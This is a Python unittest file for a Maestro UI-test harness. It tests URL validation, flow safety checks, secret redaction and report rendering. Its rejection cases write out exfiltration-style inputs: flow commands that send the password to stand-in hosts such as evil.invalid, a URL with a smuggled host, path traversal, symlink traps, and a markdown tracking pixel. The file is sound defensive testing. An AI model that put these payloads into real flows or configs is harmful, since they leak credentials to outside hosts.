from __future__ import annotations

import base64
import io
import json
import os
import sys
import tempfile
from pathlib import Path
import unittest
from unittest import mock


SCRIPTS_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS_DIR))

import check_test_automation as automation  # noqa: E402
import maestro_safety  # noqa: E402
import redact_maestro  # noqa: E402
import render_maestro_report as reports  # noqa: E402


class LoopbackURLTests(unittest.TestCase):
    def test_accepts_explicit_loopback_http_origins(self) -> None:
        for value in ("http://127.0.0.1:18585", "http://localhost:1"):
            with self.subTest(value=value):
                maestro_safety.validate_loopback_http_url(value)

    def test_rejects_ambiguous_or_non_loopback_urls(self) -> None:
        values = (
            "https://127.0.0.1:18585",
            "http://example.invalid:18585",
            "http://127.0.0.1:18585@evil.example",
            "http://localhost:18585.evil.example",
            "http://127.0.0.1",
            "http://127.0.0.1:",
            "http://127.0.0.1:0",
            "http://127.0.0.1:65536",
            "http://127.0.0.1:not-a-port",
            "http://127.0.0.1:18585/",
            "http://127.0.0.1:18585?next=//evil.example",
            "http://127.0.0.1:18585?",
            "http://127.0.0.1:18585#fragment",
            "http://127.0.0.1:18585#",
            "http://127.0.0.1:18585?#",
            "http://127.0.0.1:18585\nhttps://evil.example",
        )
        for value in values:
            with self.subTest(value=value):
                with self.assertRaises(maestro_safety.SafetyError):
                    maestro_safety.validate_loopback_http_url(value)

    def test_requires_exact_local_only_maestro_config(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            config = Path(raw) / "config.yaml"
            config.write_text(maestro_safety.EXPECTED_MAESTRO_CONFIG)
            maestro_safety.validate_maestro_config(config)

            config.write_text(
                maestro_safety.EXPECTED_MAESTRO_CONFIG
                + "onFlowStart:\n  - runScript: exfiltrate.js\n"
            )
            with self.assertRaises(maestro_safety.SafetyError):
                maestro_safety.validate_maestro_config(config)


class FlowSafetyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        self.flow = self.root / "e2e" / "maestro" / "flows" / "test.yaml"
        self.helpers = self.root / "e2e" / "maestro" / "helpers"
        self.flow.parent.mkdir(parents=True)
        self.helpers.mkdir(parents=True)
        self.root_patch = mock.patch.object(automation, "ROOT", self.root)
        self.helpers_patch = mock.patch.object(automation, "HELPERS_DIR", self.helpers)
        self.root_patch.start()
        self.helpers_patch.start()

    def tearDown(self) -> None:
        self.helpers_patch.stop()
        self.root_patch.stop()
        self.temporary.cleanup()

    def write_flow(self, body: str, evidence: str | None = "evidence-test") -> None:
        evidence_command = f"- takeScreenshot: {evidence}\n" if evidence is not None else ""
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
            "- inputText: ${MAESTRO_PASSWORD}\n"
            f"{body}"
            f"{evidence_command}"
        )

    def assert_rejected(self, body: str) -> None:
        self.write_flow(body)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_accepts_inline_conditional_subflow(self) -> None:
        self.write_flow(
            "- launchApp\n"
            "- runFlow:\n"
            "    when:\n"
            "      visible: Safe label\n"
            "    commands:\n"
            "      - tapOn: Safe label\n"
        )
        automation.validate_flow(self.flow)

    def test_accepts_and_validates_repository_helper(self) -> None:
        helper = self.helpers / "scroll.yaml"
        helper.write_text(
            "- repeat:\n"
            "    times: 2\n"
            "    commands:\n"
            "      - runFlow:\n"
            "          when:\n"
            "            notVisible:\n"
            "              id: ${TARGET_ID}\n"
            "          commands:\n"
            "            - swipe:\n"
            "                start: 10%,70%\n"
            "                end: 10%,60%\n"
        )
        self.write_flow("- runFlow: ../helpers/scroll.yaml\n")
        automation.validate_flow(self.flow)

    def test_rejects_exfiltration_capable_commands(self) -> None:
        bodies = (
            "- openLink: //example.invalid/${MAESTRO_PASSWORD}\n",
            "- runScript: scripts/exfiltrate.js\n",
            "- addMedia: /tmp/private-file\n",
            "- assertWithAI: Read this screen\n",
            "- assertNoDefectsWithAI\n",
            "- extractTextWithAI: Read this screen\n",
            "- launchApp:\n    appId: https:${MAESTRO_PASSWORD}//example.invalid\n",
            '- "openLink": //example.invalid/${MAESTRO_PASSWORD}\n',
            '- {openLink: "//example.invalid/${MAESTRO_PASSWORD}"}\n',
            '- {runScript: scripts/exfiltrate.js}\n',
            '- "runScript": scripts/exfiltrate.js\n',
            "-\n  runScript: scripts/exfiltrate.js\n",
            '- "launchApp":\n    appId: other-target\n',
            "- evalScript: ${MAESTRO_PASSWORD}\n",
            "- copyTextFrom: Password\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_external_file_subflows(self) -> None:
        outside = self.root / "outside.yaml"
        outside.write_text("- tapOn: Unsafe\n")
        bodies = (
            "- runFlow: ../../../outside.yaml\n",
            "- runFlow:\n    file: ../../../outside.yaml\n",
            '- runFlow:\n    "file": ../../../outside.yaml\n',
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_outside_input_text(self) -> None:
        bodies = (
            "- tapOn:\n    id: ${MAESTRO_PASSWORD}\n",
            "- assertVisible: ${MAESTRO_PASSWORD}\n",
            "- inputText: prefix-${MAESTRO_PASSWORD}\n",
            "- runFlow:\n    env:\n      TARGET_ID: ${MAESTRO_PASSWORD}\n    commands:\n      - tapOn: Safe\n",
            "- assertVisible: ${http.post('ht' + 'tps://evil.invalid', MAESTRO_PASSWORD)}\n",
            "- assertVisible: ${HOME}\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_in_header(self) -> None:
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "env:\n"
            "  LEAK: ${MAESTRO_PASSWORD}\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
        )
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_rejects_header_target_overrides(self) -> None:
        headers = (
            "url: https://evil.invalid",
            "appId: https://evil.invalid",
        )
        for override in headers:
            with self.subTest(override=override):
                self.flow.write_text(
                    "url: ${MAESTRO_SERVER_URL}\n"
                    "name: Safety fixture\n"
                    "tags:\n"
                    "  - lab\n"
                    f"{override}\n"
                    "---\n"
                    "- inputText: ${MAESTRO_USERNAME}\n"
                    "- inputText: ${MAESTRO_PASSWORD}\n"
                )
                with self.assertRaises(automation.ValidationError):
                    automation.validate_flow(self.flow)

    def test_rejects_symlinked_flow(self) -> None:
        target = self.root / "outside-flow.yaml"
        self.write_flow("- launchApp\n")
        self.flow.replace(target)
        self.flow.symlink_to(target)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_accepts_one_literal_final_evidence_screenshot(self) -> None:
        self.write_flow("- launchApp\n", evidence="evidence-auth-signed-in")
        automation.validate_flow(self.flow)

    def test_rejects_unsafe_or_ambiguous_evidence_screenshots(self) -> None:
        values = (
            "screenshot",
            "evidence-../outside",
            "/tmp/evidence-outside",
            "evidence-folder/file",
            "${MAESTRO_PASSWORD}",
            '"evidence-quoted"',
        )
        for value in values:
            with self.subTest(value=value):
                self.write_flow("- launchApp\n", evidence=value)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_flow(self.flow)

        self.write_flow(
            "- launchApp\n- takeScreenshot: evidence-first\n",
            evidence="evidence-second",
        )
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_requires_evidence_to_be_the_final_top_level_command(self) -> None:
        self.write_flow(
            "- launchApp\n- takeScreenshot: evidence-too-early\n- tapOn: Safe\n",
            evidence=None,
        )
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)


class RedactionTests(unittest.TestCase):
    def test_sanitizes_text_and_binary_artifacts(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            text_artifact = root / "commands.json"
            binary_artifact = root / "screenshot.bin"
            text_artifact.write_text(f'{{"password":"{secret}"}}')
            binary_artifact.write_bytes(b"prefix\x00" + secret.encode() + b"\xffsuffix")

            self.assertEqual(redact_maestro.sanitize_tree(root, [secret]), 0)

            self.assertNotIn(secret.encode(), text_artifact.read_bytes())
            self.assertNotIn(secret.encode(), binary_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), text_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), binary_artifact.read_bytes())

    def test_stream_redacts_repeated_and_non_newline_occurrences(self) -> None:
        source = io.StringIO("secret once secret\nfinal-secret")
        destination = io.StringIO()
        with mock.patch.object(sys, "stdin", source), mock.patch.object(sys, "stdout", destination):
            self.assertEqual(redact_maestro.stream(["secret"]), 0)
        self.assertEqual(
            destination.getvalue(),
            f"{redact_maestro.REDACTION} once {redact_maestro.REDACTION}\n"
            f"final-{redact_maestro.REDACTION}",
        )

    def test_cli_requires_a_nonempty_password(self) -> None:
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            sys, "argv", ["redact_maestro.py", "stream"]
        ), mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(redact_maestro.main(), 2)

    def test_rejects_artifact_symlink_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            (root / "linked.txt").symlink_to(target)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_secret_bearing_artifact_filename(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}.txt").write_text("safe contents")
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_secret_bearing_directory_name(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}").mkdir()
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_symlinked_artifact_root_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            outside = Path(raw) / "outside"
            outside.mkdir()
            target = outside / "victim.txt"
            target.write_text(secret)
            root = Path(raw) / "artifacts"
            root.symlink_to(outside, target_is_directory=True)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_hardlinked_artifact_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            os.link(target, root / "linked.txt")

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)


class ReportTests(unittest.TestCase):
    PNG = base64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
    )

    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        self.flows = self.root / "e2e" / "maestro" / "flows"
        self.run_dir = (
            self.root
            / "e2e"
            / "maestro"
            / ".artifacts"
            / "suites"
            / "smoke"
            / "20260717T010203Z.abcdef"
        )
        (self.root / "docs" / "testing").mkdir(parents=True)
        (self.run_dir / "raw").mkdir(parents=True)
        (self.run_dir / "statuses").mkdir()

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def configure(self, entries: list[tuple[str, str, str]]) -> None:
        suite = []
        proofs = []
        for index, (flow, user, evidence) in enumerate(entries, 1):
            path = self.root / flow
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(
                "url: ${MAESTRO_SERVER_URL}\n"
                f"name: Report flow {index}\n"
                "tags:\n"
                "  - smoke\n"
                "  - lab\n"
                "---\n"
                "- launchApp\n"
                f"- takeScreenshot: {evidence}\n"
            )
            suite.append({"flow": flow, "user": user})
            proofs.append(
                {
                    "case_id": f"AUTH-{index:03d}",
                    "status": "automated" if index == 1 else "partial",
                    "runner": "maestro-web",
                    "specs": [flow],
                    "scope": f"Safe report scope {index}.",
                }
            )
        (self.root / "e2e" / "maestro" / "suites.json").write_text(
            json.dumps({"schema_version": 1, "suites": {"smoke": suite}})
        )
        (self.root / "docs" / "testing" / "automation.json").write_text(
            json.dumps({"schema_version": 1, "proofs": proofs})
        )

    def png_with_text_metadata(self) -> bytes:
        iend = self.PNG.rfind(b"\x00\x00\x00\x00IEND")
        self.assertGreater(iend, 0)
        data = b"Comment\x00private metadata"
        chunk = reports.png_chunk(b"tEXt", data)
        return self.PNG[:iend] + chunk + self.PNG[iend:]

    def png_with_chunk(self, kind: bytes, data: bytes) -> bytes:
        iend = self.PNG.rfind(b"\x00\x00\x00\x00IEND")
        self.assertGreater(iend, 0)
        return self.PNG[:iend] + reports.png_chunk(kind, data) + self.PNG[iend:]

    def add_result(
        self,
        flow: str,
        evidence: str,
        *,
        exit_code: int,
        junit_status: str,
        include_marker: bool = True,
        include_evidence: bool = True,
    ) -> Path:
        slug = reports.flow_slug(flow)
        raw = self.run_dir / "raw" / slug
        debug = raw / "debug"
        debug.mkdir(parents=True)
        if include_marker:
            (raw / ".sanitized").write_text("sanitized\n")
        failure = "<failure>failed</failure>" if junit_status != "SUCCESS" else ""
        (raw / "report.xml").write_text(
            "<testsuites><testsuite tests=\"1\" failures=\"0\" time=\"2.5\">"
            f"<testcase name=\"Report\" status=\"{junit_status}\" time=\"2.5\">"
            f"{failure}</testcase></testsuite></testsuites>"
        )
        (raw / "console.log").write_text(
            f"root={self.root} target=http://127.0.0.1:43210 result={junit_status}\n"
        )
        if include_evidence:
            (debug / f"{evidence}.png").write_bytes(self.png_with_text_metadata())
        status = self.run_dir / "statuses" / f"{slug}.exit"
        status.write_text(f"{exit_code}\n")
        return raw

    def render(self) -> tuple[Path, bool]:
        return reports.render_report(
            root=self.root,
            suite_name="smoke",
            run_dir=self.run_dir,
            harness_revision="abc123def456",
            harness_dirty=False,
            harness_sha256=reports.harness_content_sha256(self.root),
            deployed_this_run=False,
            reset_requested=False,
            maestro_version="2.6.1",
            platform="web",
            generated_at="2026-07-17T01:02:03Z",
        )

    def test_renders_portable_passing_report_and_strips_png_metadata(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")

        report, valid = self.render()

        self.assertTrue(valid)
        body = report.read_text()
        self.assertIn("**PASS**", body)
        self.assertIn("`AUTH-001` (automated)", body)
        self.assertIn(f"screenshots/{evidence}.png", body)
        self.assertNotIn(str(self.root), body)
        self.assertNotIn("43210", body)
        copied = report.parent / "screenshots" / f"{evidence}.png"
        self.assertTrue(copied.is_file())
        self.assertNotIn(b"tEXt", copied.read_bytes())
        self.assertNotIn(b"private metadata", copied.read_bytes())
        self.assertEqual(copied.stat().st_mode & 0o777, 0o600)
        manifest = json.loads((report.parent / "manifest.json").read_text())
        self.assertEqual(manifest["summary"]["passed"], 1)
        self.assertEqual(manifest["harness_revision"], "abc123def456")
        self.assertFalse(manifest["deployed_this_run"])
        self.assertEqual(manifest["screenshot_review_status"], "UNREVIEWED")
        self.assertIn("source revision was not attested", body)
        self.assertFalse((report.parent / "logs").exists())
        self.assertNotIn("fake Maestro output", body)

    def test_failure_omits_unreviewed_png_and_marks_later_flow_not_run(self) -> None:
        first = "e2e/maestro/flows/auth/password-login.yaml"
        second = "e2e/maestro/flows/navigation/admin-modules.yaml"
        self.configure(
            [
                (first, "lab-admin-b", "evidence-auth-signed-in"),
                (second, "lab-admin-b", "evidence-admin-modules"),
            ]
        )
        raw = self.add_result(
            first,
            "evidence-auth-signed-in",
            exit_code=1,
            junit_status="ERROR",
            include_evidence=False,
        )
        (raw / "debug" / "screenshot-failure.png").write_bytes(self.PNG)

        report, valid = self.render()

        self.assertFalse(valid)
        body = report.read_text()
        self.assertIn("> **FAIL**", body)
        self.assertIn("❌ FAIL", body)
        self.assertIn("⏭️ NOT RUN", body)
        self.assertIn("automatic failure captures are private", body)
        self.assertEqual(list((report.parent / "screenshots").iterdir()), [])

    def test_invalid_sanitized_marker_fails_closed(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        raw = self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        (raw / ".sanitized").write_text("not-sanitized\n")

        report, valid = self.render()

        self.assertFalse(valid)
        self.assertIn("⚠️ ERROR", report.read_text())
        self.assertEqual(list((report.parent / "screenshots").iterdir()), [])

    def test_missing_sanitized_marker_fails_closed_but_writes_report(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        self.add_result(
            flow,
            evidence,
            exit_code=0,
            junit_status="SUCCESS",
            include_marker=False,
        )

        report, valid = self.render()

        self.assertFalse(valid)
        self.assertIn("⚠️ ERROR", report.read_text())
        self.assertEqual(list((report.parent / "screenshots").iterdir()), [])

    def test_missing_passing_evidence_writes_failing_normalized_junit(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        self.add_result(
            flow,
            evidence,
            exit_code=0,
            junit_status="SUCCESS",
            include_evidence=False,
        )

        report, passed = self.render()

        self.assertFalse(passed)
        junit = report.parent / "junit" / "auth-password-login.xml"
        body = junit.read_text()
        self.assertIn('failures="1"', body)
        self.assertIn('status="ERROR"', body)

    def test_rejects_symlink_in_trusted_artifact_tree(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        raw = self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        outside = self.root / "outside.txt"
        outside.write_text("outside")
        (raw / "linked.txt").symlink_to(outside)

        with self.assertRaises(reports.ReportError):
            self.render()

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])

    def test_rejects_nonfinite_junit_duration_and_cleans_staging(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        raw = self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        (raw / "report.xml").write_text(
            '<testsuites><testsuite><testcase status="SUCCESS" time="NaN"/>'
            "</testsuite></testsuites>"
        )

        with self.assertRaises(reports.ReportError):
            self.render()

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])
        self.assertFalse((self.run_dir / "report").exists())

    def test_rejects_non_utf8_junit_declarations(self) -> None:
        path = self.run_dir / "utf16.xml"
        xml = (
            '<?xml version="1.0" encoding="UTF-16"?>'
            '<!DOCTYPE testsuites [<!ENTITY ok "SUCCESS">]>'
            '<testsuites><testsuite><testcase status="&ok;" time="1.0"/>'
            "</testsuite></testsuites>"
        )
        path.write_bytes(xml.encode("utf-16"))

        with self.assertRaises(reports.ReportError):
            reports.parse_junit(path)

    def test_treats_skipped_or_contradictory_junit_as_failure(self) -> None:
        skipped = self.run_dir / "skipped.xml"
        skipped.write_text(
            '<testsuites><testsuite tests="1" failures="0">'
            '<testcase status="SUCCESS" time="0.1"><skipped/></testcase>'
            "</testsuite></testsuites>"
        )
        contradictory = self.run_dir / "contradictory.xml"
        contradictory.write_text(
            '<testsuites><testsuite tests="1" failures="1">'
            '<testcase status="SUCCESS" time="0.1"/>'
            "</testsuite></testsuites>"
        )

        self.assertEqual(reports.parse_junit(skipped), ("FAIL", 0.1))
        self.assertEqual(reports.parse_junit(contradictory), ("FAIL", 0.1))

    def test_rejects_unknown_critical_png_chunk_and_cleans_staging(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        raw = self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        secret = b"SHOULD-NOT-SURVIVE-REPORT"
        (raw / "debug" / f"{evidence}.png").write_bytes(
            self.png_with_chunk(b"SECR", secret)
        )

        with self.assertRaises(reports.ReportError):
            self.render()

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])
        self.assertFalse((self.run_dir / "report").exists())

    def test_rejects_duplicate_evidence_names(self) -> None:
        shared = "evidence-shared"
        self.configure(
            [
                ("e2e/maestro/flows/auth/one.yaml", "lab-admin-b", shared),
                ("e2e/maestro/flows/navigation/two.yaml", "lab-admin-b", shared),
            ]
        )

        with self.assertRaises(reports.ReportError):
            self.render()

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])

    def test_rejects_duplicate_flow_names(self) -> None:
        entries = [
            (
                "e2e/maestro/flows/auth/one.yaml",
                "lab-admin-b",
                "evidence-first",
            ),
            (
                "e2e/maestro/flows/navigation/two.yaml",
                "lab-admin-b",
                "evidence-second",
            ),
        ]
        self.configure(entries)
        second = self.root / entries[1][0]
        second.write_text(second.read_text().replace("Report flow 2", "Report flow 1"))

        with self.assertRaises(reports.ReportError):
            self.render()

    def test_rejects_colliding_flattened_flow_slugs(self) -> None:
        self.configure(
            [
                (
                    "e2e/maestro/flows/foo/bar-baz.yaml",
                    "lab-admin-b",
                    "evidence-first",
                ),
                (
                    "e2e/maestro/flows/foo-bar/baz.yaml",
                    "lab-admin-b",
                    "evidence-second",
                ),
            ]
        )

        with self.assertRaises(reports.ReportError):
            self.render()

    def test_escapes_markdown_from_flow_metadata(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        path = self.root / flow
        path.write_text(
            path.read_text().replace(
                "name: Report flow 1",
                "name: Screenshot ![tracking](https://attacker.invalid/pixel)",
            )
        )
        self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")

        report, passed = self.render()

        self.assertTrue(passed)
        body = report.read_text()
        self.assertNotIn("![tracking](https://attacker.invalid/pixel)", body)
        self.assertIn(r"!\[tracking\]", body)

    def test_rejects_harness_changes_during_suite(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        original_hash = reports.harness_content_sha256(self.root)
        (self.root / flow).write_text((self.root / flow).read_text() + "# changed\n")

        with self.assertRaises(reports.ReportError):
            reports.render_report(
                root=self.root,
                suite_name="smoke",
                run_dir=self.run_dir,
                harness_revision="abc123def456",
                harness_dirty=True,
                harness_sha256=original_hash,
                deployed_this_run=False,
                reset_requested=False,
                maestro_version="2.6.1",
                platform="web",
            )

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])

    def test_rechecks_harness_immediately_before_publish(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        self.add_result(flow, evidence, exit_code=0, junit_status="SUCCESS")
        digest = reports.harness_content_sha256(self.root)

        with mock.patch.object(
            reports,
            "harness_content_sha256",
            side_effect=[digest, "0" * 64],
        ), self.assertRaises(reports.ReportError):
            reports.render_report(
                root=self.root,
                suite_name="smoke",
                run_dir=self.run_dir,
                harness_revision="abc123def456",
                harness_dirty=False,
                harness_sha256=digest,
                deployed_this_run=False,
                reset_requested=False,
                maestro_version="2.6.1",
                platform="web",
            )

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])
        self.assertFalse((self.run_dir / "report").exists())

    def test_rejects_unsafe_proof_metadata(self) -> None:
        flow = "e2e/maestro/flows/auth/password-login.yaml"
        evidence = "evidence-auth-signed-in"
        self.configure([(flow, "lab-admin-b", evidence)])
        automation_path = self.root / "docs" / "testing" / "automation.json"
        data = json.loads(automation_path.read_text())
        data["proofs"][0]["case_id"] = "AUTH-001` ![remote](https://attacker.invalid/pixel) `"
        automation_path.write_text(json.dumps(data))

        with self.assertRaises(reports.ReportError):
            self.render()

        self.assertEqual(list(self.run_dir.glob(".report-staging-*")), [])

    def test_rejects_symlink_in_artifact_anchor(self) -> None:
        anchor = self.root / "trusted"
        outside = self.root / "outside"
        anchor.mkdir()
        outside.mkdir()
        linked = anchor / "linked"
        linked.symlink_to(outside, target_is_directory=True)

        with self.assertRaises(reports.ReportError):
            reports.assert_real_path_chain(linked / "child", self.root)


if __name__ == "__main__":
    unittest.main()
